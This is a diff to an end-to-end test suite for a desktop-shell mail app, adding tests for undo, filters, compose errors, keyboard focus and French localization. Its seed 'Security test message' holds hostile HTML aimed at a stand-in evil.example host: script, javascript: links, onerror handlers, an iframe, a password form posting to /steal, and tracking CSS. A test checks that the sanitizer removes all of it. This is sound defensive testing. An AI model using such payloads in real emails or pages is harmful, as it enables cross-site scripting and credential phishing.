@@ -169,7 +169,7 @@ export async function seed({ gmail = false } = {}) {
       html: `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/refresh"><script>window.top.postMessage('pwned','*')</script><link rel="stylesheet" href="https://evil.example/style.css"><base href="https://evil.example/"></head>
 <body><h2 id="safe-heading">Totally safe content</h2><p>Click <a id="js-link" href="javascript:alert(1)">here</a> or <a id="web-link" href="https://www.example.com/page">a normal link</a>.</p>
 <img id="onerror-img" src="x" onerror="alert(1)"><iframe src="https://evil.example/frame"></iframe><form action="https://evil.example/steal"><input name="password"><button>Go</button></form>
-<object data="https://evil.example/x.swf"></object><svg><script>alert(2)</script></svg><div style="background:url(https://evil.example/bg.png)">Background</div></body></html>`,
+<object data="https://evil.example/x.swf"></object><svg><script>alert(2)</script></svg><div style="background:url(https://evil.example/bg.png)">Background</div><div style="background-image:image-set('https://evil.example/set.png' 1x)">Image set</div></body></html>`,
       text: 'Totally safe content',
     },
     { flags: [], ago: 2.5 * D },
@@ -423,7 +423,7 @@ async function launch(opts) {
   cur = s;
   return s;
 }
-const mailApp = (p) => p.evaluate(() => !!document.querySelector('.app-mail')?.__mail);
+const mailApp = (p) => p.evaluate(() => [...document.querySelectorAll('.app-mail')].some((el) => el.__mail));
 async function rowBySubject(p, text) {
   const loc = p.locator(`${M} .ml-item`, { has: p.locator('.ml-subj', { hasText: text }) }).first();
   await loc.waitFor({ timeout: 10000 });
@@ -637,7 +637,9 @@ export async function runTests() {
   await step('read: hostile HTML is neutralized', async () => {
     await openBySubject(p, 'Security test message');
     const doc = await srcdoc(p);
-    for (const bad of ['<script', 'javascript:', '<iframe', '<object', 'evil.example/style.css', 'evil.example/refresh', 'evil.example/bg.png', '<form', 'href="https://evil.example/"']) assert(!doc.includes(bad), `srcdoc must not contain ${bad}`);
+    for (const bad of ['<script', 'javascript:', '<iframe', '<object', 'evil.example/style.css', 'evil.example/refresh', 'evil.example/bg.png', 'evil.example/set.png', '<form', 'href="https://evil.example/"']) assert(!doc.includes(bad), `srcdoc must not contain ${bad}`);
+    // Untrusted subject / sender never become markup in the shell document.
+    assert(!(await p.$(`${M} .ml-reader-head img, ${M} .ml-list img`)), 'no element created from headers');
     assert(!/\son[a-z]+\s*=/i.test(doc.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, '')), 'no inline event handlers');
     assert(doc.includes('safe-heading') && doc.includes('href="https://www.example.com/page"'), 'safe content kept');
     const frame = p.frameLocator(`${M} iframe.ml-frame`);
@@ -685,6 +687,30 @@ export async function runTests() {
     await until(() => p.evaluate(() => window.__aurora.wm.list().some((w) => w.appId === 'notepad')), { msg: 'csv opened in Notepad' });
     await p.evaluate(() => window.__aurora.wm.list().filter((w) => w.appId === 'notepad').forEach((w) => w.close(true)));
     await p.evaluate(() => window.__aurora.wm.list().find((w) => w.appId === 'mail')?.focus());
+    // Opening it again reuses the copy in Downloads instead of making "data (1).csv".
+    const notepads = () => p.evaluate(() => window.__aurora.wm.list().filter((w) => w.appId === 'notepad').length);
+    await until(async () => (await notepads()) === 0, { msg: 'Notepad closed' });
+    await p.click(`${M} .ml-att[data-name="data.csv"]`);
+    await until(async () => (await notepads()) === 1, { msg: 'csv opened again' });
+    await p.evaluate(() => window.__aurora.wm.list().filter((w) => w.appId === 'notepad').forEach((w) => w.close(true)));
+    await until(async () => (await notepads()) === 0, { msg: 'Notepad closed again' });
+    await p.evaluate(() => window.__aurora.wm.list().find((w) => w.appId === 'mail')?.focus());
+    const csvs = fs.readdirSync(path.join(home, 'Downloads')).filter((f) => f.startsWith('data'));
+    assert(csvs.join() === 'data.csv', `one copy in Downloads (${csvs})`);
+    // A Downloads folder that cannot be written: a clear, localized error (no raw errno).
+    const dirs = path.join(home, '.config', 'user-dirs.dirs');
+    fs.writeFileSync(dirs, 'XDG_DOWNLOAD_DIR="/sys"\n');
+    try {
+      await p.click(`${M} .ml-att[data-name="chart.png"] .ml-att-menu`);
+      await p.click('.menu .menu-item:has-text("Save to Downloads")');
+      const dlg = await p.waitForSelector(`${M} .dialog-layer:not(.closing) .dialog`, { timeout: 10000 });
+      const txt = await dlg.textContent();
+      assert(/permission to use/.test(txt) && !/EACCES|errno/.test(txt), `permission error text: ${txt}`);
+      await p.keyboard.press('Escape');
+      await p.waitForSelector(`${M} .dialog-layer`, { state: 'detached' });
+    } finally {
+      fs.rmSync(dirs, { force: true });
+    }
   });
 
   await step('flags: quick actions, toolbar and shortcuts sync with the server', async () => {
@@ -727,6 +753,26 @@ export async function runTests() {
     await p.waitForSelector(`${M} .ml-read-bar button[name=archive]:not([disabled])`);
     await p.click(`${M} .ml-read-bar button[name=archive]`);
     await until(() => srv.box('Archive').messages.length === arch0 + 1, { msg: 'archived' });
+    // Undo (snackbar button, like Outlook) moves it back
+    await p.click(`${M} .ml-snack button:has-text("Undo")`);
+    await until(() => srv.box('Archive').messages.length === arch0 && serverMsg(srv, 'INBOX', /Subject: Invoice 1031/), { msg: 'undo moved it back to the inbox' });
+    await rowBySubject(p, 'Invoice 1031');
+    await p.waitForSelector(`${M} .ml-snack:has-text("Undone")`);
+    const firstGroup = await p.textContent(`${M} .ml-group`);
+    assert(firstGroup === 'Today', `a message moved back keeps its date order (first group: ${firstGroup})`);
+    // A move the server refuses is reported (imapflow returns false instead of throwing)
+    const refused = await p.evaluate(async () => {
+      const { api } = await import('app://shell/core/api.js');
+      const acc = (await api.invoke('mail:accounts'))[0];
+      const list = await api.invoke('mail:list', acc.id, 'INBOX', { pageSize: 1 });
+      try {
+        await api.invoke('mail:move', acc.id, 'INBOX', [list.messages[0].uid], 'No such folder');
+        return 'no error';
+      } catch (e) {
+        return e.code;
+      }
+    });
+    assert(refused === 'ESERVER', `refused move reported (${refused})`);
     // Drag & drop a message onto a folder
     const junk0 = srv.box('Junk').messages.length;
     const src = await rowBySubject(p, 'Invoice 1023');
@@ -754,6 +800,14 @@ export async function runTests() {
     await p.waitForSelector(`${M} .ml-list-empty:has-text("didn't find")`);
     await p.click(`${M} button[name=clear-search]`);
     await until(async () => (await p.$$eval(`${M} .ml-item:not(.skeleton)`, (els) => els.length)) >= 50, { msg: 'full list back' });
+    // Filter: Unread -> only unread rows, the button shows it is on; "Clear" turns it off again
+    await p.click(`${M} button[name=filter]`);
+    await p.click('.menu .menu-item:has-text("Unread")');
+    await until(async () => (await p.$$(`${M} .ml-item:not(.skeleton)`)).length > 0 && !(await p.$(`${M} .ml-item:not(.skeleton):not(.unread)`)), { msg: 'unread filter' });
+    assert(await p.$(`${M} button[name=filter].on`), 'filter button on');
+    await p.click(`${M} button[name=clear-search]`);
+    await until(async () => (await p.$$eval(`${M} .ml-item:not(.skeleton)`, (els) => els.length)) >= 50, { msg: 'unfiltered list back' });
+    assert(!(await p.$(`${M} button[name=filter].on`)), 'filter button off after Clear');
   });
 
   await step('compose: chips, autocomplete, formatting, drag & drop attachment, send, Sent copy', async () => {
@@ -877,6 +931,34 @@ export async function runTests() {
     await p.evaluate(() => window.__aurora.wm.list().find((w) => w.appId === 'mail')?.focus());
   });
 
+  await step('relaunch: with only a pop-out composer open, Mail reopens its main window', async () => {
+    await p.click(`${M} .ml-list`);
+    await p.keyboard.press('Control+n');
+    await p.waitForSelector(`${M} .ml-readpane .ml-compose`);
+    await p.click(`${M} .ml-compose button[name=popout]`);
+    await p.waitForSelector(`${M} .ml-compose-window .ml-compose`);
+    await p.evaluate(() => window.__aurora.wm.list().find((w) => w.el.__mail).close(true));
+    await until(async () => !(await mailApp(p)), { msg: 'main window closed' });
+    // Start menu / taskbar: the composer window is the only Mail window, it must not just get focus
+    await p.evaluate(() => {
+      window.__aurora.shell.launch('mail');
+    });
+    await until(() => mailApp(p), { msg: 'main window reopened' });
+    await p.waitForSelector(`${M} .ml-item:not(.skeleton)`, { timeout: 20000 });
+    // A mailto: from another app reaches the main window even though the composer comes first
+    await p.evaluate(() => {
+      window.__aurora.shell.launch('mail', { mailto: 'mailto:carol@example.com?subject=Hi%20Carol' });
+    });
+    await p.waitForSelector(`${M} .ml-readpane .ml-compose .ml-chip[data-address="carol@example.com"]`);
+    await p.click(`${M} .ml-readpane .ml-compose button[name=discard]`);
+    await p.waitForSelector(`${M} .ml-readpane .ml-compose`, { state: 'detached' });
+    // The pop-out composer is behind the new main window: bring it forward, then close it.
+    await p.evaluate(() => window.__aurora.wm.list().find((w) => w.el.querySelector('.ml-compose-window'))?.focus());
+    await p.click(`${M} .ml-compose-window button[name=discard]`);
+    await until(async () => !(await p.$(`${M} .ml-compose-window`)), { msg: 'pop-out composer closed' });
+    await p.evaluate(() => window.__aurora.wm.list().find((w) => w.el.__mail)?.focus());
+  });
+
   await step('compose: unsaved prompt when opening another message', async () => {
     await p.click(`${M} .ml-list`);
     await p.keyboard.press('Control+n');
@@ -887,6 +969,48 @@ export async function runTests() {
     await p.click(`${M} .dialog button:has-text("Don't save")`);
     await p.waitForSelector(`${M} .ml-read-subject:has-text("Photo from the trip")`);
     assert(!(await p.$(`${M} .ml-compose`)), 'composer closed');
+  });
+
+  await step('compose: Ctrl+Enter twice without a subject asks once and sends once', async () => {
+    const n0 = srv.captured.length;
+    await p.click(`${M} .ml-list`);
+    await p.keyboard.press('Control+n');
+    await p.waitForSelector(`${M} .ml-compose`);
+    await p.keyboard.type('bob@example.com');
+    await p.keyboard.press('Enter');
+    await p.click(`${M} .ml-editor`);
+    await p.keyboard.down('Control');
+    await p.keyboard.press('Enter');
+    await p.keyboard.press('Enter');
+    await p.keyboard.up('Control');
+    await p.waitForSelector(`${M} .dialog:has-text("No subject")`);
+    await sleep(300);
+    assert((await p.$$(`${M} .dialog-layer:not(.closing)`)).length === 1, 'a single confirmation');
+    await p.click(`${M} .dialog-layer:not(.closing) .dialog button.primary`);
+    await p.waitForSelector(`${M} .ml-snack:has-text("Message sent")`, { timeout: 20000 });
+    await sleep(800);
+    assert(srv.captured.length === n0 + 1, `sent exactly once (${srv.captured.length - n0})`);
+  });
+
+  await step('compose: a missing attachment is reported clearly', async () => {
+    const gone = path.join(home, 'Documents', 'gone.txt');
+    fs.writeFileSync(gone, 'x');
+    await p.click(`${M} .ml-list`);
+    await p.keyboard.press('Control+n');
+    await p.waitForSelector(`${M} .ml-compose`);
+    await p.keyboard.type('bob@example.com');
+    await p.keyboard.press('Enter');
+    await p.fill(`${M} .ml-subject`, 'Attachment gone');
+    await p.evaluate((f) => document.querySelector('.app-mail').__mail.composer.addFiles([f]), gone);
+    await p.waitForSelector(`${M} .ml-attach-row .ml-att[data-name="gone.txt"]`);
+    fs.rmSync(gone);
+    await p.click(`${M} .ml-compose button[name=send]`);
+    const err = await p.waitForSelector(`${M} .ml-send-error`, { timeout: 15000 });
+    assert(/“gone\.txt” couldn't be found/.test(await err.textContent()), `missing attachment message: ${await err.textContent()}`);
+    assert(await p.isEnabled(`${M} .ml-compose button[name=send]`), 'Send is available again');
+    await p.click(`${M} .ml-compose button[name=discard]`);
+    await p.click(`${M} .dialog-layer:not(.closing) .dialog button.danger`);
+    await p.waitForSelector(`${M} .ml-compose`, { state: 'detached' });
   });
 
   await step('folders: context menu "Mark all as read"', async () => {
@@ -965,6 +1089,28 @@ export async function runTests() {
     await p.waitForSelector(`${M} .ml-compose`, { state: 'detached' });
   });
 
+  await step('settings: no stray text, stacked radios, focus stays in the dialog (Esc works)', async () => {
+    await p.click(`${M} button[name=settings]`);
+    await p.waitForSelector(`${M} .ml-settings`);
+    await p.click(`${M} button[name=section-signature]`);
+    const txt = await p.textContent(`${M} .ml-set-content`);
+    assert(!/\bnull\b|undefined/.test(txt), `no stray text on the signature page: ${txt}`);
+    await p.click(`${M} button[name=section-reading]`);
+    const tops = await p.$$eval(`${M} .ml-radio`, (els) => els.map((e) => e.getBoundingClientRect().top));
+    assert(tops.length === 2 && tops[1] > tops[0] + 10, `radio options stacked (${tops})`);
+    await p.click(`${M} button[name=section-accounts]`);
+    await p.click(`${M} .ml-settings button[name=remove-account]`);
+    await p.waitForSelector(`${M} .dialog:has-text("Remove account")`);
+    await p.keyboard.press('Escape');
+    await p.waitForSelector(`${M} .dialog:has-text("Remove account")`, { state: 'detached' });
+    await until(() => p.evaluate(() => !!document.querySelector('.app-mail .ml-settings')?.contains(document.activeElement)), { msg: 'focus back in the settings dialog' });
+    await p.click(`${M} .ml-settings button[name=add-account]`);
+    await p.waitForSelector(`${M} .ml-settings .ml-provider`);
+    await sleep(150);
+    await p.keyboard.press('Escape');
+    await p.waitForSelector(`${M} .ml-settings`, { state: 'detached' });
+  });
+
   await step('keyboard: arrows move through the list and open messages', async () => {
     await (await rowBySubject(p, 'Fresh news from Zoé')).click();
     await p.focus(`${M} .ml-list`);
@@ -974,6 +1120,31 @@ export async function runTests() {
     await p.waitForSelector(`${M} .ml-read-subject:has-text(${JSON.stringify(subjects[2])})`, { timeout: 10000 });
     await p.keyboard.press('Home');
     await p.waitForSelector(`${M} .ml-read-subject:has-text(${JSON.stringify(subjects[0])})`, { timeout: 10000 });
+  });
+
+  await step('keyboard: Tab stays in the window; the folder tree is one Tab stop', async () => {
+    await p.focus(`${M} .ml-list`);
+    const seen = [];
+    for (let i = 0; i < 45; i++) {
+      await p.keyboard.press('Tab');
+      seen.push(await p.evaluate(() => {
+        const a = document.activeElement;
+        // <body> can be a transient (a pane re-rendered under the focus); the next Tab re-enters Mail.
+        return { ok: !!a?.closest('.app-mail') || a === document.body, what: `${a?.tagName}.${String(a?.className || '').split(' ')[0]}${a?.name ? `[${a.name}]` : ''}` };
+      }));
+    }
+    assert(seen.every((x) => x.ok), `focus never walks out to the taskbar or the desktop: ${seen.map((x) => x.what).join(' > ')}`);
+    assert(seen.filter((x) => x.what.startsWith('BODY')).length <= 1, `focus is not lost repeatedly: ${seen.map((x) => x.what).join(' > ')}`);
+    // From <body> (focused control gone), Tab goes back into the window
+    await p.evaluate(() => document.activeElement?.blur());
+    await p.keyboard.press('Tab');
+    assert(await p.evaluate(() => !!document.activeElement?.closest('.app-mail')), 'Tab from <body> re-enters the Mail window');
+    assert((await p.$$(`${M} .ml-folder[tabindex="0"]`)).length === 1, 'one folder in the Tab order');
+    await p.focus(`${M} .ml-folder.sp-inbox`);
+    await p.keyboard.press('ArrowDown');
+    assert(await p.evaluate(() => document.activeElement.classList.contains('sp-drafts')), 'ArrowDown moves inside the tree');
+    await p.keyboard.press('Home');
+    assert(await p.evaluate(() => document.activeElement.classList.contains('sp-inbox')), 'Home goes to the first folder');
   });
 
   await step('message window: double-click opens it, actions work there', async () => {
@@ -1071,6 +1242,14 @@ export async function runTests() {
     await until(async () => (await p.$(`${M} .ml-offline:not([hidden]) .infobar`)) || (await p.$(`${M} .ml-list-banner .infobar.error`)), { timeout: 20000, msg: 'offline / error shown' });
     await sleep(300);
     await s.shot('mail-offline');
+    // The offline bar belongs to that account: switching away hides it, switching back shows it.
+    await p.click(`${M} button[name=account]`);
+    await p.click(`.menu .menu-item:has-text("${USER}")`);
+    await p.waitForSelector(`${M} .ml-item:not(.skeleton)`, { timeout: 20000 });
+    await until(() => p.$eval(`${M} .ml-offline`, (el) => el.hidden), { msg: 'offline bar hidden for the working account' });
+    await p.click(`${M} button[name=account]`);
+    await p.click('.menu .menu-item:has-text("alice2@aurora.test")');
+    await until(() => p.$eval(`${M} .ml-offline`, (el) => !el.hidden), { timeout: 20000, msg: 'offline bar back for the offline account' });
     await p.click(`${M} button[name=settings]`);
     await p.click(`${M} .ml-acct-row:has-text("alice2@aurora.test") button[name=remove-account]`);
     await p.click(`${M} .dialog:has-text("Remove account") button:has-text("Remove")`);
@@ -1080,6 +1259,7 @@ export async function runTests() {
     await p.waitForSelector(`${M} .ml-item:not(.skeleton)`, { timeout: 20000 });
     const accs = await p.evaluate(() => window.aurora.invoke('mail:accounts'));
     assert(accs.length === 1 && accs[0].email === USER, 'account removed from accounts.json');
+    assert(await p.$eval(`${M} .ml-offline`, (el) => el.hidden), 'no offline bar left over from the removed account');
   });
 
   await step('layout: medium width uses a navigation rail', async () => {
@@ -1135,6 +1315,34 @@ export async function runTests() {
     docShot(await s.shot('mail-maximized'));
   });
 
+  await step('i18n: switching to French live relabels every pane, nothing typed is lost', async () => {
+    await (await rowBySubject(p, 'Your weekly digest')).click();
+    await p.waitForSelector(`${M} .ml-reader:not(.loading) iframe.ml-frame`);
+    await p.fill(`${M} .ml-search-input`, 'brouillon');
+    try {
+      await p.evaluate(() => window.__aurora.settings.set('lang', 'fr'));
+      await p.waitForSelector(`${M} button[name=new-mail]:has-text("Nouveau message")`);
+      assert((await p.getAttribute(`${M} button[name=refresh]`, 'aria-label')) === 'Actualiser', 'list header relabeled');
+      assert((await p.textContent(`${M} .ml-read-bar button[name=reply] .lbl`)) === 'Répondre', 'reading pane relabeled');
+      assert((await p.getAttribute(`${M} .ml-reader`, 'aria-label')) === 'Volet de lecture', 'reading pane name');
+      assert((await p.inputValue(`${M} .ml-search-input`)) === 'brouillon', 'search text kept');
+      await p.fill(`${M} .ml-search-input`, '');
+      await p.focus(`${M} .ml-list`);
+      await p.keyboard.press('Control+n');
+      await p.waitForSelector(`${M} .ml-compose`);
+      await p.fill(`${M} .ml-subject`, 'Sujet gardé');
+      await p.evaluate(() => window.__aurora.settings.set('lang', 'en'));
+      await p.waitForSelector(`${M} .ml-compose button[name=send] .lbl:text-is("Send")`);
+      assert((await p.getAttribute(`${M} .ml-subject`, 'placeholder')) === 'Add a subject', 'composer relabeled');
+      assert((await p.inputValue(`${M} .ml-subject`)) === 'Sujet gardé', 'composer content kept');
+      await p.click(`${M} .ml-compose button[name=discard]`);
+      await p.click(`${M} .dialog-layer:not(.closing) .dialog button.danger`);
+      await p.waitForSelector(`${M} .ml-compose`, { state: 'detached' });
+    } finally {
+      await p.evaluate(() => window.__aurora.settings.set('lang', 'en'));
+    }
+  });
+
   await s.close();
 
   // ---------------------------------------------------------------- French + dark
@@ -1180,6 +1388,48 @@ export async function runTests() {
     overflow = await overflowCheck();
     assert(!overflow.length, `overflow (composer) in ${overflow}`);
     await p.click(`${M} .ml-compose button[name=discard]`);
+  });
+
+  await step('fr/dark: "00:19" hours, long subjects clamped, readable danger buttons', async () => {
+    const t = await p.evaluate(async () => {
+      const { listDate, fullDate } = await import('app://shell/apps/mail/lib/util.js');
+      const d = new Date();
+      d.setHours(0, 19, 0, 0);
+      return { list: listDate(d.toISOString(), window.__aurora.i18n), full: fullDate(d.toISOString(), window.__aurora.i18n) };
+    });
+    assert(t.list === '00:19' && /00:19/.test(t.full), `French hours (${t.list} / ${t.full})`);
+    const long = `Objet très long ${'lorem ipsum dolor sit amet '.repeat(14)}fin`;
+    srv.deliver(await build({ from: { name: 'Long Objet', address: 'long@example.com' }, to: USER, subject: long, text: 'Corps du message.', date: new Date() }));
+    await openBySubject(p, 'Objet très long');
+    const sub = await p.$eval(`${M} .ml-read-subject`, (el) => ({ h: el.clientHeight, sh: el.scrollHeight, title: el.title, lh: parseFloat(getComputedStyle(el).lineHeight) }));
+    assert(sub.h <= sub.lh * 3 + 2 && sub.sh > sub.h, `subject clamped to 3 lines (${JSON.stringify(sub)})`);
+    assert(sub.title === long, 'full subject in the tooltip');
+    const frameH = await p.$eval(`${M} iframe.ml-frame`, (f) => f.getBoundingClientRect().height);
+    assert(frameH > 200, `message body still visible (${frameH}px)`);
+    await p.focus(`${M} .ml-list`);
+    await p.keyboard.press('Delete');
+    await p.click(`${M} .ml-folder.sp-trash`);
+    await (await rowBySubject(p, 'Objet très long')).click();
+    await p.focus(`${M} .ml-list`);
+    await p.keyboard.press('Delete');
+    const ratio = await p.$eval(`${M} .dialog-layer:not(.closing) .btn.danger`, (b) => {
+      const rgb = (c) => c.match(/[\d.]+/g).slice(0, 3).map(Number);
+      const lum = (c) => {
+        const [r, g, b2] = rgb(c).map((v) => {
+          v /= 255;
+          return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4;
+        });
+        return 0.2126 * r + 0.7152 * g + 0.0722 * b2;
+      };
+      const cs = getComputedStyle(b);
+      const a = lum(cs.color);
+      const c = lum(cs.backgroundColor);
+      return (Math.max(a, c) + 0.05) / (Math.min(a, c) + 0.05);
+    });
+    assert(ratio >= 4.5, `danger button contrast ${ratio.toFixed(2)}`);
+    await p.click(`${M} .dialog-layer:not(.closing) .btn.danger`);
+    await until(async () => !(await p.$(`${M} .ml-item .ml-subj:has-text("Objet très long")`)), { msg: 'deleted for good' });
+    await inbox(p);
   });
 
   await step('fr/dark: welcome (separate profile)', async () => {
